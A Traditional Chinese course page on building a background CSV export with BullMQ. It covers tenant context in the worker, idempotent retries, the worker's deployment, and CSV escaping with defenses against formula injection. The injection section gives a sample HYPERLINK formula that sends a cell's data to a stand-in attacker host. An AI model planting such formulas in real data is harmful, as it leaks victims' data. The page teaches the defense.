@@ -1,0 +1,278 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" href="data:,">
+<title>13. 背景工作：匯出</title>
+<link rel="stylesheet" href="../../style.css">
+</head>
+<body data-lesson="13" data-practice="nestjs" data-task="pf13">
+<header>
+  <div class="eyebrow">階段 B2：平台功能 · 第 13 課</div>
+  <h1>背景工作：匯出</h1>
+</header>
+<main>
+<p>客戶要把 project 清單匯出成 CSV 給財務。第一版寫在請求裡：查出全部 project、組成 CSV、直接回傳。測試資料只有幾十筆，按下去馬上就好。上線後，一個大租戶的財務按下「匯出」，伺服器要跑 40 秒。API 前面還有一層負載平衡器，它負責把請求分給後面的伺服器，也替每個請求計時，30 秒沒有回應就切斷連線。前端收到錯誤，財務以為沒成功，又按了一次。伺服器上於是有兩份一樣的匯出同時在跑：第一份其實還在算，只是算完也送不回去了。</p>
+<p>這一課跟著這份匯出走完全程：先把它從請求裡拿出來交給背景，讓 API 立刻回應；接著解決背景裡沒有請求、因此不知道租戶是誰的問題；再讓它失敗會重試、重跑也不出錯；然後確認產生的 CSV 在財務的 Excel 裡不會錯位、也不會被當成公式執行；最後決定執行背景工作的程式要跟 API 放在一起還是分開。做完之後，你的 SaaS 會多一個 <code>exports</code> 模組。</p>
+
+<div class="callout"><strong>這課會用到：</strong>
+<ul>
+  <li><a href="../../nestjs/lessons/20-queues-bullmq.html">NestJS 課第 20 課</a>的 BullMQ：<code>queue.add</code> 放工作、<code>WorkerHost</code> 處理工作、<code>attempts</code>／<code>backoff</code> 重試、jobId 去重，以及「至少一次，所以要冪等」。</li>
+  <li><a href="08-tenant-isolation-prisma.html">第 8 課</a>的 <code>RequestContext</code>（用 AsyncLocalStorage 存這個請求的租戶）與 TenantDb 的自動租戶條件；找不到租戶就丟錯（fail closed）。</li>
+  <li><a href="09-rls-defense-in-depth.html">第 9 課</a>的 RLS：交易裡沒有 <code>set_config('app.tenant_id', …)</code> 就一列都看不到。</li>
+  <li><a href="12-file-uploads.html">第 12 課</a>的 <code>StorageService</code> 與下載標頭。</li>
+</ul></div>
+
+<div class="callout">程式寫在你自己的 SaaS repo。判分時先啟動你的 API（worker 也要在跑：同一個程序，或另外啟動），在 learn 資料夾執行 <code>node check.mjs nestjs pf13</code>。測試輪詢匯出狀態最多等 15 秒。</div>
+
+<p>這課的路線：</p>
+<ul>
+  <li>為什麼匯出不能在請求裡做完；交給背景之後，API 要做哪幾件事、前端怎麼知道好了沒（第 1–2 節）。</li>
+  <li>worker 裡沒有請求，租戶從哪裡來：用 job 帶的 <code>tenantId</code> 重建同一套租戶上下文（第 3 節）。</li>
+  <li>失敗、重跑兩次、放進佇列失敗時，各會留下什麼（第 4 節）。</li>
+  <li>CSV 本身的兩個坑：跳脫與公式注入（第 5 節）。</li>
+  <li>worker 跟 API 同一個程序還是分開（ADR 0005），再套到你的業務模組（第 6–7 節）。</li>
+</ul>
+
+<h2>為什麼匯出不能在請求裡做完？</h2>
+<p>先看第一版到底卡在哪裡。一個 HTTP 請求是一問一答：瀏覽器送出請求之後，連線一直開著，等伺服器回應。這條路上的每一段都有自己的時間上限：負載平衡器有，瀏覽器有，前端的 HTTP 套件也可能設了逾時。匯出需要的時間跟資料量成正比，而資料只會越來越多，總有一天會超過路上最短的那個上限。</p>
+<p>逾時本身還不是最糟的。逾時只代表「連線斷了」，伺服器上的程式並不知道，會繼續查詢、組 CSV，做完才發現沒有人可以送。這段時間它一直佔著資料庫連線與記憶體，讓其他請求變慢。財務看到失敗再按一次，就多一份一樣的工作；按三次就是三份。把逾時調長也解決不了：界線只是往後推，而且財務要盯著轉圈的畫面等 40 秒，中途關掉分頁就白做了。</p>
+<p>解法是把「接受工作」和「做工作」拆開。API 收到請求時只把工作記下來，立刻回應「收到了」；真正的工作交給另一段程式在背景慢慢做，這段程式叫 <strong>worker</strong>。兩者之間需要一個地方放「待做的工作」，讓 API 放進去、worker 拿出來，這就是<strong>佇列</strong>（queue）。<a href="../../nestjs/lessons/20-queues-bullmq.html">NestJS 課第 20 課</a>用的 BullMQ 就是一套佇列：工作存在 Redis，每一件工作叫一個 job；API 用 <code>queue.add</code> 放進 job，worker 是一個繼承 <code>WorkerHost</code> 的類別，BullMQ 每拿到一個 job 就呼叫它的 <code>process</code>。</p>
+<p>拆開之後，前端怎麼知道做好了沒？HTTP 有一個狀態碼專門表達這件事：<code>202 Accepted</code>，意思是「請求收到了、會處理，但還沒做完」。API 回 202 時附上這份工作的 ID，前端拿這個 ID 每隔幾秒問一次「好了沒」，這叫<strong>輪詢</strong>（polling）。回答是做好了，再去下載檔案。整個合約是三支 API：</p>
+<pre>POST /api/v1/exports { type: "projects" }   → 202 { id, status: "queued" }
+GET  /api/v1/exports/:id                    → 200 { id, type, status, rowCount, createdAt, finishedAt }
+                                              status：queued → running → done（或 failed）
+GET  /api/v1/exports/:id/content            → 200 CSV；還沒好 409 EXPORT_NOT_READY</pre>
+<p><code>status</code> 的四個值對應這份匯出的一生：<code>queued</code> 是已經排進佇列、還沒有 worker 拿走；<code>running</code> 是 worker 正在做；<code>done</code> 是檔案好了，可以下載；<code>failed</code> 是做失敗了。下載的 API 在還沒好時回 409：請求本身沒有錯，伺服器也沒壞，只是這份匯出目前的狀態不允許下載，前端看到它就繼續輪詢。</p>
+<p>回到開場：財務按下匯出後一秒內就拿到 202，畫面顯示「匯出中」，不會再因為逾時而重按。合約定下來了，下一個問題是 POST 收到請求時，API 具體要做哪幾件事，狀態又要存在哪裡，GET 才查得到。</p>
+
+<div class="callout practice"><strong>💡 實務上：哪些工作該交給背景</strong><br>判斷標準有三個：做完要超過一兩秒、使用者不需要當下拿到結果、失敗了可以重做。符合的工作在 SaaS 裡很常見：匯出報表、寄信、產生縮圖、呼叫很慢的第三方 API。代價也要講清楚：多一個 Redis 要維運，多一種「排隊中、失敗了」的狀態，前端要做輪詢與進度的畫面。所以只要幾百毫秒、使用者要立刻看到結果的事（例如建立一個 project），留在請求裡同步做，不要為了「感覺比較進階」而背景化。</div>
+
+<h2>API 收到匯出請求，要做哪幾件事？</h2>
+<p>API 只做三件事，順序有講究：先在 <code>exports</code> 表建一筆 <code>queued</code> 的紀錄，跟稽核寫在同一個交易（第 11 課）；交易 commit 之後，把 job 放進佇列；最後回 202 與 ID。為什麼一定要先 commit 再放進佇列，第 4 節談到失敗時再回來看。</p>
+<pre>// src/exports/exports.module.ts
+async create(type: string) {
+  const exp = await this.db.tx(async tx =&gt; {
+    const e = await tx.export.create({ data: { tenantId: this.ctx.tenantId!, type, requestedBy: this.ctx.userId! } })
+    await this.audit.record(tx, 'export.requested', 'export', e.id)
+    return e
+  })
+  // jobId 用匯出的 id：同一筆還在佇列裡時，重複加進來不會多一個 job
+  await this.queue.add('export', { exportId: exp.id, tenantId: exp.tenantId, userId: this.ctx.userId!, requestId: this.ctx.requestId },
+    { jobId: exp.id, attempts: 3, backoff: { type: 'exponential', delay: 1000 }, removeOnComplete: true, removeOnFail: 100 })
+  return { id: exp.id, status: exp.status }
+}</pre>
+<p>先看第一步：為什麼要另外建一張 <code>exports</code> 表，不直接用 BullMQ 記的 job 狀態回答 <code>GET /exports/:id</code>？BullMQ 確實記得每個 job 跑到哪裡，但有兩個原因不能拿它當準。第一，job 不會永遠留在 Redis。上面的 <code>removeOnComplete: true</code> 讓完成的 job 從 Redis 刪掉，<code>removeOnFail: 100</code> 只留最近 100 個失敗的 job 給工程師查看；不這樣設，Redis 的記憶體會隨著 job 數量一直長。財務三天後回來下載，job 早就不在了。第二，Redis 裡的 job 沒有租戶隔離：用 ID 查 job 時，沒有任何東西檢查它屬於哪個租戶。<code>exports</code> 表有 tenant_id、走 TenantDb、受 RLS 保護，所以 <code>GET /exports/:id</code> 跟 project 一樣，別的租戶的 id 是 404。結論是：狀態以資料表為準，BullMQ 只負責排隊與派工。</p>
+<p>再看第二步放進佇列的東西。job 的資料是 <code>{ exportId, tenantId, userId, requestId }</code>，只有 ID 與上下文，沒有 project 的內容。NestJS 課第 20 課講過理由：job 的資料是放進去那一刻的快照，排隊期間資料可能已經改了，所以 worker 執行時才從資料庫讀。這四個欄位各有用途：</p>
+<ul>
+  <li><code>exportId</code>：worker 要處理哪一筆匯出。</li>
+  <li><code>tenantId</code>：這一課新增的，下一節的主角。它取自 <code>RequestContext</code>，也就是從登入的 access token 解出來的，不是請求 body 的欄位。如果從 body 拿，使用者改一個欄位就能替別的租戶排一份匯出。</li>
+  <li><code>userId</code>：誰要求的，worker 執行時一樣有「目前使用者」。</li>
+  <li><code>requestId</code>：讓 worker 的 log 跟原本那個請求串在一起，出事時查得到完整經過（第 16 課）。</li>
+</ul>
+<p><code>queue.add</code> 的第三個參數是 job 的選項。<code>jobId: exp.id</code> 指定 job 的 ID：同一個 ID 的 job 還在 Redis 時，再放一次會被忽略，第 4 節收拾殘局時會用到。<code>attempts</code> 與 <code>backoff</code> 決定失敗時怎麼重試，也留到第 4 節。各選項的整理見課末「補充與查表」。</p>
+<p>到這裡 API 的工作結束了。接下來 worker 從佇列拿到這個 job，要去查這個租戶的 project，可是它怎麼知道現在是哪個租戶？</p>
+
+<h2>worker 拿到 job 時，怎麼知道是哪個租戶？</h2>
+<p>要回答這個問題，先回想在請求裡，這件事是誰做好的。請求進來時，第 8 課的中介軟體驗過 access token，用 <code>RequestContext.run</code> 開一段 AsyncLocalStorage 的上下文，把 tenantId 放進去；之後這個請求呼叫到的每個函式，不用傳參數也讀得到它。TenantDb 的 Prisma extension 從那裡讀 tenantId，替每個查詢自動加上租戶條件，並在每個交易開始時用 <code>set_config('app.tenant_id', …)</code> 告訴 PostgreSQL，第 9 課的 RLS 才會放行這個租戶的列。</p>
+<p>worker 的情況完全不同。呼叫 <code>process</code> 的是 BullMQ：它從 Redis 拿到 job 就呼叫，中間沒有 HTTP 請求、沒有 access token，也沒有中介軟體幫你開 AsyncLocalStorage，<code>ctx.tenantId</code> 是 undefined。第 8、9 課的兩道防線都拿不到租戶。這時有兩條路：</p>
+<div class="table-wrap"><table>
+  <thead><tr><th>做法</th><th>結果</th></tr></thead>
+  <tbody>
+    <tr><td>給 worker 一個「系統身分」：用擁有者連線或 BYPASSRLS 的角色，自己在查詢裡加 <code>where: { tenantId }</code></td><td>兩道防線都關掉了，只剩手寫的那個 where。忘了一次，匯出的檔案裡就是所有租戶的資料</td></tr>
+    <tr><td>用 job 的 <code>tenantId</code> 開一個跟請求一樣的上下文（參考實作）</td><td>extension 自動加條件、RLS 照常擋，worker 的程式跟 service 長得一樣</td></tr>
+  </tbody>
+</table></div>
+<p>第一條路看起來省事，問題在於安全全靠每個查詢手寫的條件。現在匯出只查 projects，之後加上成員、檔案的匯出，每一個查詢都要記得加；忘一次，所有租戶的資料就寫進某個客戶下載的檔案，而且不會有任何錯誤訊息。第二條路是讓 worker 自己做中介軟體做的那件事：用 job 帶來的 tenantId 開上下文。<a href="../../auth/lessons/20-multi-tenancy.html">auth 課第 20 課</a>討論過這個取捨：資料離開有租戶上下文的請求時，要把 tenantId 明確帶著走，到另一邊再重建上下文。這裡把它變成實際的程式：</p>
+<pre>// src/exports/exports.processor.ts
+@Processor(EXPORTS_QUEUE)
+export class ExportsProcessor extends WorkerHost {
+  constructor(private readonly db: TenantDb, private readonly ctx: RequestContext, private readonly storage: StorageService) {
+    super()
+  }
+
+  process(job: Job&lt;ExportJob&gt;) {
+    const { exportId, tenantId, userId, requestId } = job.data
+    return this.ctx.run({ requestId, tenantId, userId }, () =&gt; this.run(exportId))
+  }
+
+  private async run(exportId: string) {
+    const exp = await this.db.client.export.findUnique({ where: { id: exportId } })
+    if (!exp || exp.status === 'done') return
+    await this.db.client.export.update({ where: { id: exportId }, data: { status: 'running' } })
+    const projects = await this.db.client.project.findMany({ orderBy: [{ createdAt: 'asc' }, { id: 'asc' }] })
+    …
+  }
+}</pre>
+<p><code>ctx.run</code> 就是中介軟體在每個請求做的事（第 8 課的 <code>RequestContext.run</code>），差別只在租戶 ID 的來源：請求裡來自 token，這裡來自 job 的資料。而 job 裡的 tenantId，是 API 放進佇列時從 token 取的，所以「租戶來自登入身分」這條線沒有斷。進了 <code>run</code> 之後，<code>this.db.client</code> 的每個操作照常經過 extension 與 <code>set_config</code>，worker 不需要知道 RLS 的存在，查 projects 的寫法也跟 service 裡一模一樣。</p>
+<p>傳給 <code>ctx.run</code> 的函式有一個寫法上的陷阱，請求裡不會遇到，worker 裡會：</p>
+<div class="callout warn">Prisma 的查詢是 lazy 的：<code>findMany()</code> 回傳的 PrismaPromise 要到 <code>await</code> 時才執行，extension 也是那時才讀 AsyncLocalStorage。寫成 <code>ctx.run(c, () =&gt; this.db.client.project.findMany())</code>，回傳的 promise 在 <code>run</code> 外面才被 await，extension 讀不到租戶。所以傳進去的一定是 async 函式、在裡面 await 完（上面的 <code>this.run(exportId)</code> 就是）。請求裡不會遇到，因為整個請求都在中介軟體開的 <code>run</code> 裡；worker、測試、腳本會。</div>
+<p>如果完全忘了 <code>ctx.run</code> 會怎樣？第一個經過 TenantDb 的查詢找不到租戶，直接丟錯（fail closed）。job 失敗，BullMQ 重試三次後放進失敗清單，匯出停在 <code>queued</code>，log 裡是「沒有租戶上下文」。財務等不到檔案，很難看，但沒有任何資料外洩，而且錯誤訊息直接指出原因。對照第一條路忘了 where 的結果：檔案照樣產生、狀態是 <code>done</code>，裡面卻是所有租戶的資料。這就是第 8 課堅持 fail closed 的理由：寧可失敗得很明顯，也不要成功得很危險。</p>
+
+<div class="callout practice"><strong>💡 實務上：每個進入點都要問「租戶從哪來」</strong><br>HTTP 請求只是進入點之一。排程（每晚的提醒信）、佇列的 worker、webhook、管理用的 CLI 腳本、資料修正的 migration，都沒有使用者的 token。資深工程師加一個新的進入點時會先回答兩個問題：租戶 ID 從哪裡來（job 資料、webhook 的帳號對應、腳本的參數）、在哪裡開上下文。答不出來的進入點，就是之後跨租戶事故的來源。排程要處理所有租戶時，也是一個租戶開一個上下文、逐一處理。這一課的匯出 worker 就是你作品裡第一個非 HTTP 的進入點。</div>
+
+<h2>匯出失敗或跑了兩次，會留下什麼？</h2>
+<p>租戶對了，匯出可以正確跑完一次。但背景工作不能假設一次就成功，也不能假設只跑一次。BullMQ 保證的是<strong>至少一次</strong>（at-least-once）：放進去的 job 一定會被執行，但可能不只一次。為什麼？worker 拿走 job 之後如果當機，佇列沒辦法知道它做到哪裡：可能檔案已經寫好、只差更新狀態，也可能才剛開始。佇列只有兩個選擇：當作做完了（可能弄丟工作），或再派一次（可能做兩次）。BullMQ 選後者，worker 做完、回報完成前當機的 job 會被當成 stalled 重做（NestJS 課第 20 課）。除了當機，<code>attempts: 3</code> 也會主動重跑：<code>process</code> 丟錯時，BullMQ 依 <code>backoff</code> 等一段時間再跑（從 1000 ms 開始，間隔指數拉長），最多跑 3 次。所以對 worker 來說，同一份匯出被執行兩次以上是正常情況，不是例外。</p>
+<p>能承受這件事的 worker 要<strong>冪等</strong>（idempotent）：同一件工作做兩次，結果跟做一次一樣。套到匯出，「結果」指的是兩樣東西：儲存裡的檔案，以及 <code>exports</code> 那一列的狀態。接著上一節的 <code>run</code>：</p>
+<pre>// src/exports/exports.processor.ts（接上面）
+  try {
+    const body = csv(['id', 'name', 'description', 'archived', 'createdAt'],
+      projects.map(p =&gt; [p.id, p.name, p.description, p.archivedAt ? 'true' : 'false', p.createdAt.toISOString()]))
+    const storageKey = `tenants/${this.ctx.tenantId}/exports/${exportId}.csv`
+    await this.storage.put(storageKey, body)             // 重跑就整份覆蓋同一個 key
+    await this.db.client.export.update({ where: { id: exportId }, data: { status: 'done', storageKey, rowCount: projects.length, finishedAt: new Date() } })
+  } catch (e) {
+    this.logger.error(`匯出 ${exportId} 失敗：${(e as Error).message}`)
+    await this.db.client.export.update({ where: { id: exportId }, data: { status: 'failed', error: '匯出失敗', finishedAt: new Date() } })
+    throw e                                               // 讓 BullMQ 照 attempts 重試
+  }</pre>
+<p>冪等靠三個地方。第一是上一節 <code>run</code> 開頭的檢查：狀態已經是 <code>done</code> 就直接結束，完成的匯出被重派也不會再做一次。第二是<strong>整份重新產生、覆蓋同一個 key</strong>：key 只由 tenantId 與 exportId 決定，重跑寫到同一個位置，內容也一樣。這裡沒有「做到一半」的狀態需要接續。如果改成分批追加寫入，或用當下的時間當檔名，重跑就會多出重複的列，或多出一個檔案。第三是 <code>done</code> 寫在最後：檔案寫好之後才改狀態，所以只要狀態是 <code>done</code>，檔案一定在。</p>
+<p>失敗也要有交代。catch 裡把狀態寫成 <code>failed</code>，財務就不會看著「匯出中」永遠等下去。<code>error</code> 欄位給使用者看的是固定的一句「匯出失敗」，真正的錯誤訊息可能含 SQL、檔案路徑這些內部資訊，只寫進 log。寫完狀態之後 <code>throw e</code> 把錯誤丟回去，BullMQ 才知道這次失敗、照 <code>attempts</code> 再跑；重試成功時，狀態會從 <code>failed</code> 再變成 <code>done</code>。少了這行 throw，BullMQ 會以為 job 成功了，不再重試。</p>
+<p>還有一個失敗發生在 worker 碰到 job 之前，參考實作沒有處理：<code>create()</code> 先 commit 紀錄、再 <code>queue.add</code>。如果這時 Redis 剛好連不上，財務收到 500，資料表裡卻留著一筆永遠 <code>queued</code> 的匯出，因為佇列裡根本沒有對應的 job。這就是 <a href="../../nestjs/lessons/20-queues-bullmq.html">NestJS 課第 20 課</a>的<strong>雙寫問題</strong>：資料庫與 Redis 是兩個系統，沒有一個交易能同時包住兩邊，中間失敗就一邊有、一邊沒有。把 <code>queue.add</code> 搬進交易裡也沒用，只是換成另一種殘局：job 出去了，交易卻在 commit 時失敗，worker 拿到一個資料庫裡不存在的 exportId；或者交易還沒 commit，worker 就先拿到 job，讀不到這一列，走 <code>!exp</code> 直接結束，job 算成功，紀錄卻永遠停在 <code>queued</code>。<code>run</code> 開頭的 <code>!exp</code> 只能避免 worker 因此出錯，救不回這筆紀錄。所以參考實作選擇先 commit：失敗時留下的是一筆看得到、可以收拾的 <code>queued</code> 紀錄。</p>
+<p>作品可以接受這個殘局，但要有收拾的方法：排程找出「<code>queued</code> 超過 10 分鐘」的紀錄重新放進佇列（jobId 一樣，重複放不會多一個），或標成 <code>failed</code>。NestJS 課第 20 課的 outbox 能從根本解決，但對一個作品的匯出功能來說太重。把這個已知限制與收拾方法寫進 ADR 的「後果」或 README 的「已知限制」，面試時主動講出來是加分。</p>
+
+<h2>產生的 CSV，財務用 Excel 打開會出什麼事？</h2>
+<p>匯出的流程可靠了，最後看檔案內容本身。上一節的程式用一行 <code>csv(…)</code> 帶過的那個函式，藏著這一課第二個安全問題（第一個是第 3 節 worker 拿錯租戶、匯出別人的資料）。CSV 看起來只是「用逗號把值接起來」，但有兩個坑。</p>
+<p>第一個是<strong>跳脫</strong>。CSV 用逗號分欄、用換行分列，如果值本身就含有逗號或換行，讀檔的程式就分不出哪裡是欄位的邊界。project 名稱是使用者自己填的，什麼字元都可能出現。規則寫在 RFC 4180：值裡有逗號、雙引號或換行時，整格用雙引號包起來，裡面原本的雙引號寫兩次。名稱 <code>逗號, 和 "引號"</code> 要寫成 <code>"逗號, 和 ""引號"""</code>。沒處理的話，它會被切成兩格，後面的欄位全部往右錯一格，財務看到的「建立時間」欄裡放的是描述。</p>
+<p>第二個是<strong>公式注入</strong>（CSV injection）。財務不會用文字編輯器看這個檔案，會用 Excel 打開。試算表把開頭是 <code>=</code>、<code>+</code>、<code>-</code>、<code>@</code> 的格子當成公式執行。租戶裡任何一個成員都能把 project 名稱改成 <code>=HYPERLINK("http://evil.example/?d="&amp;A2, "點我")</code>：對 API 來說這只是一個普通的字串，問題發生在檔案被打開的那一刻。財務看到一格「點我」，點下去，A2 那一格的資料就被送到攻擊者的網址。做法是在這種值前面加一個 <code>'</code>，試算表就把整格當成文字。OWASP 是整理網頁安全常見攻擊與防法的開放社群，公式注入的處理方式就是參考它的整理。下面的程式照 OWASP 的建議，tab 與 <code>\r</code> 開頭的值也一起處理。</p>
+<pre>// src/exports/csv.ts
+export function cell(value: unknown) {
+  let s = value == null ? '' : String(value)
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`
+  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
+}
+
+export const csv = (header: string[], rows: unknown[][]) =&gt; [header, ...rows].map(r =&gt; r.map(cell).join(',')).join('\r\n') + '\r\n'</pre>
+<p><code>cell</code> 的順序是先加 <code>'</code>、再判斷要不要包雙引號，這樣加上去的 <code>'</code> 也在引號裡面：<code>=HYPERLINK("x")</code> 變成 <code>"'=HYPERLINK(""x"")"</code>。<code>csv</code> 把標題列與每一列都經過 <code>cell</code>，用逗號接成一列、用 <code>\r\n</code> 接成整份。這兩個函式是純函式（只看輸入、不碰資料庫或檔案），最適合寫單元測試：參考實作在旁邊放了 <code>src/exports/csv.spec.ts</code>，你的 repo 也該有。</p>
+<p>檔案產生之後，<code>GET /exports/:id/content</code> 用第 12 課的那組下載標頭送出去（<code>attachment</code>、<code>nosniff</code>），<code>Content-Type: text/csv; charset=utf-8</code>。結果檔存在哪、多久清掉，見課末「補充與查表」。</p>
+<p>到這裡，財務按下匯出到下載檔案的整條路都完成了。剩下一個部署的決定：worker 這段程式要跑在哪裡？</p>
+
+<h2>worker 要跟 API 跑在同一個程序嗎？</h2>
+<p>要回答 worker 跑在哪裡，先說明「程序」（process）在這裡指什麼：執行一次 <code>node dist/main.js</code> 就是一個程序，它有自己的記憶體，也只有一條事件迴圈，同一時間只執行一段 JavaScript。參考實作的 <code>ExportsProcessor</code> 是 <code>ExportsModule</code> 的 provider，API 啟動時 worker 跟著啟動，兩者在同一個程序裡。意思是 worker 組 CSV 花的 CPU 時間，會跟處理 HTTP 請求搶同一條事件迴圈。ADR 0005 記下這個決定與它的代價：</p>
+<pre># 0005. 匯出用 BullMQ，worker 先跟 API 同一個程序
+
+## 決定
+API 建立匯出紀錄、回 202，把 { exportId, tenantId, userId, requestId } 放進佇列（jobId 用匯出的 id）。
+worker 用 job 的 tenantId 重建同一套租戶上下文，不用看得到所有租戶的系統身分。worker 先跟 API 同一個程序。
+
+## 後果
+- 部署只有一個服務；匯出量大到影響 API 的延遲時，把 worker 拆成獨立的程序（程式不用改，只換啟動方式）。
+- job 失敗會重試 3 次；匯出整份重新產生，所以重試是冪等的。</pre>
+<div class="table-wrap"><table>
+  <thead><tr><th></th><th>同一個程序</th><th>分開</th></tr></thead>
+  <tbody>
+    <tr><td>部署</td><td>一個服務</td><td>兩個服務（同一個映像，不同的啟動指令）</td></tr>
+    <tr><td>互相影響</td><td>匯出吃 CPU 時，API 的回應變慢</td><td>各自擴充，API 不受影響</td></tr>
+    <tr><td>關機</td><td>SIGTERM 時一起關</td><td>可以各自滾動更新</td></tr>
+  </tbody>
+</table></div>
+<p>作品先選同一個程序，因為匯出量小，一個服務最好部署、最好除錯；ADR 同時寫明了什麼時候該拆：匯出量大到讓 API 的延遲變差（練習 7 就是這個情境）。拆的成本很低，因為 worker 本來就只透過佇列跟 API 溝通，程式不用改，只換啟動方式。</p>
+<p>不管同不同程序，都會遇到另一件事：程序被停掉時，手上正在跑的 job 怎麼辦？部署新版時，部署平台會先送 SIGTERM，這是「請你自己結束」的訊號；程序沒有自己結束，平台才強制中斷它。<strong>優雅關機</strong>（graceful shutdown）就是收到 SIGTERM 之後，先把手上的事做完再結束。參考實作的 <code>main.ts</code> 有 <code>app.enableShutdownHooks()</code>，收到 SIGTERM 時 @nestjs/bullmq 會關掉 worker，BullMQ 的 <code>worker.close()</code> 預設等手上的 job 做完。就算關機時被強制中斷，那個 job 也會在重新啟動後再跑一次，這是上一節冪等要成立的另一個理由。第 17 課部署時，compose 與 CI 會出現 <code>api</code> 與 <code>worker</code> 兩個服務。</p>
+<p>匯出這條路走完了。你的業務模組多半也有一件「要很久」的事，可以照同一個模式做。</p>
+
+<h2>你的業務模組，哪件事該交給背景？</h2>
+<p>模式跟匯出一樣：資料表存狀態、job 帶 ID 與 <code>tenantId</code>、worker 裡 <code>ctx.run</code>、做成冪等。每個業務模組的差別在「誰觸發」與「怎樣才算做過了」：</p>
+<ul>
+  <li><strong>客服工單</strong>：SLA 到期提醒是排程，不是使用者觸發的：排程掃出快到期的工單，<strong>依租戶</strong>各自放進佇列，worker 每個 job 開那個租戶的上下文。寄信的冪等用「這張工單的這次提醒寄過沒」的唯一約束。</li>
+  <li><strong>預約排程</strong>：提醒信在預約前一天寄。預約被取消或改時間時，已經排好的 job 要能認出自己過期了：worker 執行時重讀預約，時間對不上就不寄。</li>
+  <li><strong>進銷存</strong>：月結報表是最典型的匯出。報表要「截至月底」的數字，worker 查詢要用時間條件，不能用執行當下的庫存；重跑同一個月要得到一樣的結果。</li>
+</ul>
+
+<h2>練習</h2>
+
+<div class="local" data-test="ex1" data-files="">
+  <p>練習 1：做出 <code>POST /api/v1/exports</code>（202 <code>{ id, status: "queued" }</code>）、<code>GET /api/v1/exports/:id</code>、<code>GET /api/v1/exports/:id/content</code>，由 worker 產生 CSV。測試會讓另一個租戶先建一個 project，再確認你的匯出輪詢到 <code>done</code>、<code>rowCount</code> 正確，CSV 標題列是 <code>id,name,description,archived,createdAt</code>，只有自己租戶的 project，名稱裡的逗號、雙引號與描述裡的換行都能原樣解析回來。</p>
+</div>
+
+<div class="local" data-test="ex2" data-files="">
+  <p>練習 2：租戶 B 讀 A 的匯出狀態與內容都 404（完成前、完成後都是）。</p>
+</div>
+
+<div class="local" data-test="ex3" data-files="">
+  <p>練習 3：viewer 建立匯出 403 <code>FORBIDDEN</code>、member 202、viewer 可以讀狀態；<code>type</code> 不是 <code>projects</code> 時 400 <code>VALIDATION_FAILED</code>。</p>
+</div>
+
+<div class="local" data-test="ex4" data-files="">
+  <p>練習 4：名稱以 <code>=</code>、<code>+</code>、<code>@</code> 開頭的 project，匯出後那一格前面多一個 <code>'</code>。</p>
+</div>
+
+<div class="quiz" data-correct="b">
+  <p>練習 5：同事為了「worker 不用管上下文」，在 processor 裡改用 <code>PrismaService</code>（app 角色、RLS 開著）查 projects，再用 <code>where: { tenantId: job.data.tenantId }</code> 過濾。上線後每一份匯出都是 <code>done</code>、<code>rowCount</code> 0。最可能的原因與修法？</p>
+  <label data-key="a">BullMQ 把 job 資料裡的 tenantId 轉成數字，比對不到；改成字串就好</label>
+  <label data-key="b">這條連線沒有 <code>set_config('app.tenant_id', …)</code>，RLS 讓查詢一列都看不到；改回用 <code>ctx.run</code> 開上下文、經過 TenantDb 查</label>
+  <label data-key="c">worker 的程序沒有 <code>app_user</code> 的權限；給 worker 用的角色加上 <code>BYPASSRLS</code></label>
+  <label data-key="d">findMany 在 worker 裡是 lazy 的，永遠不會執行；在前面加 <code>await</code> 就好</label>
+  <p class="why">✓ RLS 不知道你在程式裡寫了 where，它只看交易裡的 <code>app.tenant_id</code>，沒設就是 fail closed 的 0 列。修法是讓 worker 走跟請求一樣的路：<code>ctx.run</code>＋TenantDb。c 能讓數字出來，但等於把第二道防線拆掉，下次 where 寫錯就是跨租戶外洩。d 混淆了 lazy 的意思：await 了就會執行，問題是執行時沒有上下文。（第 13 課）</p>
+</div>
+
+<div class="quiz" data-correct="c">
+  <p>練習 6：月初大家都在匯出，佇列裡排了兩小時的工作。有個租戶的管理員等不及，按了 20 次「匯出」。POST /exports 比較好的處理是？</p>
+  <label data-key="a">照樣每次都建立紀錄、回 202：佇列本來就是用來排隊的</label>
+  <label data-key="b">佇列太長就改成在請求裡同步產生，讓使用者不用等</label>
+  <label data-key="c">同一個租戶已經有還沒完成的同類匯出，就回那一筆（或拒絕），不再建立新的；同時監控佇列長度、增加 worker</label>
+  <label data-key="d">佇列太長時回 500，讓前端顯示錯誤請使用者稍後再試</label>
+  <p class="why">✓ 一個租戶塞 20 個一樣的工作，只會讓所有租戶都等更久，這是佇列版的吵鬧鄰居（noisy neighbor：一個租戶用掉太多共用資源，拖慢其他租戶；第 14 課的主題）。限制每個租戶未完成的工作數，再從容量面解決（監控、擴 worker）。b 把慢工作搬回請求，正是這一課要避免的逾時與重複。d 的 500 表示伺服器壞了，前端與監控都會誤判；這不是錯誤，是需要排隊。（第 13 課）</p>
+</div>
+
+<div class="quiz" data-correct="a">
+  <p>練習 7：worker 跟 API 在同一個程序。每到月初大量匯出時，API 的 p99 延遲（99% 的請求都比這個值快）從 80 ms 升到 900 ms，而資料庫的負載正常。下一步該怎麼做？</p>
+  <label data-key="a">把 worker 拆成獨立的程序（同一個映像、不同的啟動指令），各自擴充；這正是 ADR 0005 寫的觸發條件</label>
+  <label data-key="b">把 BullMQ worker 的 <code>concurrency</code> 調高，讓匯出更快做完</label>
+  <label data-key="c">把 API 的連線池調大，避免請求等連線</label>
+  <label data-key="d">改用 <code>setTimeout</code> 把匯出切成小段，在 API 程序裡慢慢做</label>
+  <p class="why">✓ 資料庫正常、API 變慢，代表同一個程序裡的 CPU（組 CSV、序列化）在跟請求搶事件迴圈。拆成兩個程序後，匯出只會讓 worker 忙。b 讓同時跑的匯出更多，API 搶得更兇。c 解決的是等連線，不是這次的症狀。（第 13 課）</p>
+</div>
+
+<h2>自評清單</h2>
+<p>測試判不出來、但作品裡看得出來的事。每一項自己確認：</p>
+<ul>
+  <li><strong>fail closed 真的有效</strong>：把 processor 的 <code>ctx.run</code> 暫時拿掉，跑一次匯出，它不會變成 <code>done</code>，log 有「沒有租戶上下文」。</li>
+  <li><strong>重試是冪等的</strong>：在 worker 寫完檔案、更新狀態之前暫時 <code>throw</code>，看它重試後一樣是 <code>done</code>，檔案內容跟一次成功時一樣。</li>
+  <li><strong>CSV 有單元測試</strong>：逗號、雙引號、換行、<code>=</code> 開頭各一個案例。</li>
